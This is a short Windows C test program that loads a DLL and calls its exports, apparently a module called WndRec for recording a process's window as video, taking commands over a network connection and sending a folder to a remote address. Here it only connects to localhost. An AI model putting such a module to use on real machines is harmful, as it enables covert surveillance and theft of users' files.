#include <tchar.h>
#include <windows.h>
#include <stdio.h>
#include <conio.h>

typedef void (WINAPI *StartRecPidFunction)( char* uid, char* nameVideo, DWORD pid, const char* ip1, int port1, const char* ip2, int port2 );
typedef void (WINAPI *StartCommandsConnectionFunction)(char* uid, const char* ip1, int port1, const char* ip2, int port2);
typedef void (WINAPI *StartSendFunction)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );

int _tmain(int argc, _TCHAR* argv[])
{
	char a[] = "\xE8\xFF\x15";

	const WCHAR* dll_path = argv[1];
	
	HMODULE dll_handle = LoadLibrary(dll_path);
	//HMODULE dll_handle = LoadLibraryExW(dll_path, NULL, 0);

	printf("LoadLibrary: dll_handle=0x%X\r\n", dll_handle);
	if (dll_handle == NULL) return 0;

	HMODULE h1 = GetModuleHandle(dll_path);
	HMODULE h2 = GetModuleHandle(L"fake.dll");
	HMODULE h3 = LoadLibraryExW(dll_path, NULL, 0);
	HMODULE h4 = LoadLibrary(dll_path);

	StartRecPidFunction start_rec_by_pid = (StartRecPidFunction)GetProcAddress(dll_handle, 
		"StartRecPid");

	printf("GetProcAddress: start_rec_by_pid=0x%X\r\n", start_rec_by_pid);
	if (start_rec_by_pid == NULL) return 0;

	StartCommandsConnectionFunction start_commands = 
		(StartCommandsConnectionFunction)GetProcAddress(dll_handle, "StartTasksConnection");

	printf("GetProcAddress: start_commands=0x%X\r\n", start_commands);
	if (start_commands == NULL) return 0;

	StartSendFunction start_send = 
		(StartSendFunction)GetProcAddress(dll_handle, "StartSend");

	printf("GetProcAddress: start_send=0x%X\r\n", start_send);
	if (start_send == NULL) return 0;

	printf("WndRec loaded successfuly.\r\n");

	//start_rec_by_pid("test01876128768", "notepad", 2544, "127.0.0.1", 700, NULL, 700);
	start_commands("test01876128768", "127.0.0.1", 700, NULL, 0);
	//start_send("test01876128768", "E:\\tftp", "127.0.0.1", 700, NULL, 0);

	printf("press any key...\r\n");
	_getch();

	return 0;
}

